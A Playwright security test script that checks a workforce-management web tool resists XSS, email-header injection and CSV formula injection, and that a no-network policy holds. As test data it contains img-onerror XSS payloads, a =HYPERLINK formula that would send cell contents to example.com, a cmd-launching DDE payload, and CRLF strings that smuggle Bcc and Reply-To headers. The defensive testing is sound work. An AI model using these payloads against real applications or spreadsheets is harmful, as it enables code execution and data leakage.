// Security test: every made-up person gets a name that looks like HTML (a quote that closes an attribute, then an <img>
// whose onerror calls top.__x), the Genesys exports carry the same names, and every page is opened as each role with its
// tabs, the person panel, Search, and the Build flow up to the emails. Nothing from the data may become markup: no handler
// may run and no element from a name may be in the page or in a preview (the email previews are documents of their own),
// a line break in an address, a subject or a file name never starts a header in an Outlook draft, and text that starts like a
// formula (= + - @) stays text in the CSV files (the roster, the daily exceptions). No network: opened as
// a file, the page refuses every web address (a fetch and an image are tried), and nothing the tool does on any page is
// refused by that rule (no "securitypolicyviolation" from the tool itself).
// Usage: node test/xss.cjs page.html [outDir]
const { chromium } = require('playwright');
const fs = require('node:fs'), path = require('node:path'), os = require('node:os');
const page0 = path.resolve(process.argv[2] || 'out/mc.html');
const out = path.resolve(process.argv[3] || path.join(os.tmpdir(), 'mc-xss')); fs.mkdirSync(out, { recursive: true });
const fixture = fs.readFileSync(path.join(__dirname, 'fixture.js'), 'utf8');
// the same change in Node (for the exports) and in the page (for the roster and the history)
const MUTATE = F => {
  const evil = (s, i) => `${s} '"><img src=x onerror=top.__x(${i})>`, map = new Map();
  F.roster.forEach((p, i) => { const n = evil(p.name, i + 1); map.set(p.name, n); p.name = n; if (p.email) p.email = `spv${i + 1}'"><img src=x onerror=top.__x(${900 + i})>@example.com`; });
  for (const k of Object.keys(F.history)) { const h = F.history[k]; h.src = evil('Synthetic', 800); h.by = evil('Test', 801); for (const r of h.rows) r.n = map.get(r.n) || r.n; }
  for (const k of Object.keys(F.finals)) F.finals[k].byName = evil('Senior manager', 802);
  F.roster[3].name = '=HYPERLINK("https://example.com/?d="&B2,"Lina F.")';   // a supervisor whose name is a spreadsheet formula
  return F;
};
const exp = path.join(out, 'exports');
{
  require('./fixture.js'); MUTATE(globalThis.__FIX__);
  const argv = process.argv.slice(); process.argv[2] = exp; require('./exports.cjs'); process.argv.splice(0, process.argv.length, ...argv);
  const f = path.join(exp, 'Monthly Adherence - Sep.csv');   // and one name that is on no roster
  fs.appendFileSync(f, `"Zed Q. '""><img src=x onerror=top.__x(700)>",${Array.from({ length: 30 }, () => '91.00%').join(',')}\r\n`);
}
const USERS = {
  admin: { id: 'u0', name: 'Sara K.', username: 'sara.k', role: 'admin' },
  user: { id: 'u1', name: 'Yousef T.', username: 'yousef.t', role: 'user' },
  wfm: { id: 'u2', name: 'Noura B.', username: 'noura.b', role: 'wfm' },
  senior: { id: 'u3', name: 'Faisal M.', username: 'faisal.m', role: 'senior' },
  spv: { id: 'u4', name: 'Waleed G.', username: 'spv.one', role: 'spv', pid: 'p0' },
  quality: { id: 'u5', name: 'Huda R.', username: 'huda.r', role: 'quality' },
  agent: { id: 'a1', name: 'Lina A.', username: 'lina.a', role: 'agent', pid: 'p20' },
};
// what came from a name: a handler that ran, or an element with the planted onerror (in the page or in any preview)
const SCAN = () => {
  const o = [], where = el => { const parts = []; for (let e = el; e && parts.length < 3; e = e.parentElement) if (e.id) parts.push('#' + e.id); return parts.join(' < ') || el.className || el.tagName; };
  const look = (doc, tag) => { for (const el of doc.querySelectorAll('[onerror*="__x"], [onload*="__x"]')) o.push(`${tag}markup in ${where(el)}`); for (const fr of doc.querySelectorAll('iframe')) { let d = null; try { d = fr.contentDocument; } catch (e) { d = null; } if (d) look(d, `${tag}iframe ${fr.id || fr.className || fr.title}: `); } };
  look(document, '');
  return { ran: (window.__hits || []).splice(0), found: o };
};
(async () => {
  const b = await chromium.launch(), bad = [];
  const note = (role, step, r) => { for (const x of r.ran) bad.push(`${role} › ${step}: a handler from name ${x} ran`); for (const x of [...new Set(r.found)]) bad.push(`${role} › ${step}: ${x}`); };
  for (const [role, u] of Object.entries(USERS)) {
    const ctx = await b.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true, reducedMotion: 'reduce' }), p = await ctx.newPage(), errs = [];
    p.on('pageerror', e => errs.push('pageerror: ' + e.message));
    await p.addInitScript(([fx, mut, user]) => {
      eval(fx); (0, eval)('(' + mut + ')')(window.__FIX__);
      window.__hits = []; window.__x = i => window.__hits.push(i);
      window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.effectiveDirective || e.violatedDirective} ${e.blockedURI}`));
      window.__NOLOCK__ = true; window.__ROSTER__ = window.__FIX__.roster; window.__mcUser = user;
    }, [fixture, MUTATE.toString(), u]);
    await p.goto('file://' + page0);
    await p.waitForFunction(() => window.__mc && window.__mc.state && window.__mc.state.rosterReady, null, { timeout: 20000 });
    await p.evaluate(build => { const M = window.__mc, F = window.__FIX__; M.state.history = build ? Object.fromEntries(Object.entries(F.history).filter(([k]) => k !== '2026-09')) : F.history; M.state.finals = F.finals; M.state.histVer++; M.state.finVer = (M.state.finVer || 0) + 1; M.renderWs && M.renderWs(); }, role === 'user' || role === 'admin');
    await p.waitForTimeout(400);
    const scan = async step => note(role, step, await p.evaluate(SCAN));
    await scan('first page');
    const wss = await p.$$eval('nav#sidebar [data-ws]', bs => bs.filter(x => x.offsetParent).map(x => x.dataset.ws));
    for (const ws of wss) {
      await p.click(`nav#sidebar [data-ws="${ws}"]`); await p.waitForTimeout(500); await scan(ws);
      const tabs = await p.$$eval('main [role="tab"], main [data-wt], main #cycleBar [data-cyctab]', ts => ts.filter(x => x.offsetParent && !x.disabled).map((x, i) => { x.setAttribute('data-xss-tab', i); return i; }));
      for (const i of tabs) { const t = await p.$(`[data-xss-tab="${i}"]`); if (!t || !(await t.isVisible())) continue; await t.click().catch(() => {}); await p.waitForTimeout(350); await scan(`${ws} › tab ${i}`); }
    }
    if (role !== 'agent' && role !== 'quality') {   // the person panel and Search
      for (const pid of ['p0', 'p13', 'p20', 'p100']) { await p.evaluate(id => window.__mc.openPerson && window.__mc.openPerson(id), pid).catch(() => {}); await p.waitForTimeout(400); await scan(`person ${pid}`); await p.keyboard.press('Escape'); await p.waitForTimeout(200); }
      await p.keyboard.press('Control+k'); await p.waitForTimeout(250);
      if (await p.$('#findQ')) { await p.fill('#findQ', 'img onerror Lina'); await p.waitForTimeout(500); await scan('search'); await p.keyboard.press('Escape'); }
    }
    if (role === 'user') {   // the Build flow with the exports: Import, every Review tab, Export, the emails
      await p.evaluate(() => window.__mc.setWs('build'));
      await p.setInputFiles('#picker', fs_files());
      await p.waitForFunction(() => !window.__mc.state.pending.length && Object.keys(window.__mc.state.slots).length >= 4, null, { timeout: 40000 });
      await p.waitForTimeout(500); await scan('build › import');
      await p.click('#toReview'); await p.waitForTimeout(500); await scan('build › review');
      for (const t of ['checks', 'people', 'issues', 'preview', 'kpi', 'history']) { await p.evaluate(x => window.__mc.setTab(x), t).catch(() => {}); await p.waitForTimeout(500); await scan(`build › ${t}`); }
      for (const h of await p.$$('#checksBody .chkhead')) { await h.click().catch(() => {}); await p.waitForTimeout(120); }
      await scan('build › checks opened');
      await p.click('#wfmTabs [data-wt="export"]'); await p.waitForTimeout(400); await p.click('#build'); await p.waitForTimeout(400);
      await Promise.all([p.waitForEvent('download', { timeout: 40000 }), p.click('#buildGo')]); await p.waitForTimeout(800); await scan('build › export');
      await p.click('#wfmTabs [data-wt="emails"]'); await p.waitForTimeout(500);
      for (const s of await p.$$eval('[data-mailsub]', xs => xs.map(x => x.dataset.mailsub))) { await p.click(`[data-mailsub="${s}"]`).catch(() => {}); await p.waitForTimeout(600); await scan(`emails › ${s}`); }
      // the emails as they go out (the .eml's HTML part; its plain-text part shows names as they are, which is right)
      const bodies = await p.evaluate(() => { const M = window.__mc, o = []; for (const [k, s] of [['ded', 'review'], ['ded', 'final'], ['inc', 'review'], ['inc', 'final']]) { M.state.mailKind = k; M.state.mailStage = s; try { o.push(M.curMail().html(null, false)); } catch (e) { o.push(''); } } return o; });
      if (!bodies.some(Boolean)) bad.push('user › emails: no email could be made');
      if (bodies.some(h => /<img src=x onerror/i.test(h))) bad.push('user › emails: an email body carries a name as markup');
      // the Outlook drafts: a line break in an address, the subject or a file name never starts a header of its own
      const eml = await p.evaluate(() => window.__mc.emlFile({ to: ['Ali K. <ali@example.com>\r\nBcc: x@example.com', 'bob@example.com\nX-Evil: 1'], cc: ['C <c@example.com>\rReply-To: y@example.com'], subject: 'Hi\r\nBcc: z@example.com', text: 't', html: '<p>t</p>', attach: [{ name: 'a.xlsx"\r\nX-Evil: 2', bytes: new Uint8Array([80, 75]) }] }));
      const heads = eml.split('\r\n').filter(l => /^(bcc|x-evil|reply-to):/i.test(l));
      if (heads.length || /\r(?!\n)|(?<!\r)\n/.test(eml)) bad.push(`user › .eml: a planted line break made a header (${heads.join(' | ') || 'a bare CR or LF'})`);
    }
    const refused = await p.evaluate(() => window.__csp.splice(0));   // the tool itself never asks for anything the rule refuses
    for (const x of refused) bad.push(`${role}: the no-network rule refused something the tool did (${x})`);
    if (role === 'wfm') {   // the CSV files: no cell may start like a formula once Excel reads it
      const [rd] = await Promise.all([p.waitForEvent('download', { timeout: 20000 }), p.evaluate(() => document.getElementById('exportRoster').click())]);
      const roster = fs.readFileSync(await rd.path(), 'utf8');
      const daily = await p.evaluate(() => { const W = window.WFM, keep = W._state.model; W._state.model = { cfg: { date: '2026-09-01', thShort: 10, mask: true }, agents: new Map(), ex: { tardy: [{ agent: '=HYPERLINK("https://example.com/?d="&B3,"x")', mins: 5 }], excused: [{ agent: 'Lina A.', mins: 3, code: '@SUM(1+1)' }], leave: [{ agent: '+cmd', type: '-2+3+cmd|\' /C calc\'!A0' }] } }; try { return W._csv().csv; } finally { W._state.model = keep; } });
      for (const [n, text, min] of [['roster', roster, 2], ['daily exceptions', daily, 4]]) {
        const cells = csvCells(text), risky = cells.filter(c => /^[=+\-@\t\r]/.test(c)), kept = cells.filter(c => /^'[=+\-@]/.test(c));
        if (risky.length || kept.length < min) bad.push(`wfm › ${n} CSV: ${risky.length} cell(s) Excel would run as a formula (${risky.slice(0, 2).join(' | ')}), ${kept.length} kept as text`);
      }
    }
    if (role === 'wfm') {   // the rule is there and holds: a fetch and an image to a web address are refused by the browser
      const net = await p.evaluate(async () => {
        let fetched = 'not tried'; try { await fetch('https://example.com/mc-test'); fetched = 'answered'; } catch (e) { fetched = 'refused'; }
        await new Promise(r => { const i = new Image(); i.onload = i.onerror = r; i.src = 'https://example.com/mc-test.png'; });
        await new Promise(r => setTimeout(r, 300));
        return { meta: (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '', fetched, v: window.__csp.splice(0) };
      });
      const sawFetch = net.v.some(x => /^connect-src https:\/\/example\.com/.test(x)), sawImg = net.v.some(x => /^img-src https:\/\/example\.com/.test(x));
      console.log(`  no network: ${net.meta ? 'the rule is on' : 'NO RULE'}; a fetch was ${net.fetched}; refused by the rule: ${net.v.join(', ') || 'nothing'}`);
      if (!/default-src 'unsafe-inline' data: blob:/.test(net.meta) || net.fetched !== 'refused' || !sawFetch || !sawImg) bad.push('wfm: the no-network rule is missing or did not refuse a web address');
    }
    await p.screenshot({ path: path.join(out, `xss-${role}.png`) });
    if (errs.length) console.log(`  ${role}: ${errs.slice(0, 3).join(' | ')}`);
    console.log(`${bad.some(x => x.startsWith(role + ' ')) ? '✗' : '✓'} ${role}: ${wss.join(', ')}`);
    await ctx.close();
  }
  await b.close();
  if (bad.length) console.log('✗ ' + [...new Set(bad)].join('\n✗ '));
  console.log(bad.length ? `${new Set(bad).size} problem(s)` : 'no markup from the data anywhere');
  process.exit(bad.length ? 1 : 0);
})();
function fs_files() { return fs.readdirSync(exp).map(f => path.join(exp, f)); }
/** every cell of a CSV text, unquoted the way Excel reads it */
function csvCells(t) {
  const o = []; let c = '', q = false;
  for (let i = 0; i < t.length; i++) {
    const ch = t[i];
    if (q) { if (ch === '"' && t[i + 1] === '"') { c += '"'; i++; } else if (ch === '"') q = false; else c += ch; }
    else if (ch === '"' && c === '') q = true; else if (ch === ',' || ch === '\n') { o.push(c.replace(/\r$/, '')); c = ''; } else c += ch;
  }
  o.push(c); return o.map(x => x.replace(/^\ufeff/, ''));
}
